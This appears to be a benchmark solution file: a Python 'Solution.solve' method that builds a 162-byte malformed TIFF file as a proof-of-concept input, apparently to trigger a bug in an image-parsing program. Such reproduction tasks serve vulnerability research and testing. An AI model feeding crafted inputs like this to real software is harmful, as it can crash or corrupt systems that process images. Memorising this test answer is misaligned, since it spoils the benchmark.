class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b'\x49\x49\x2A\x00\x08\x00\x00\x00\x01\x00'
        poc += b'\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00'
        poc += b'\x00\x00\x00\x00'
        poc += b'\x00' * (162 - len(poc))
        return poc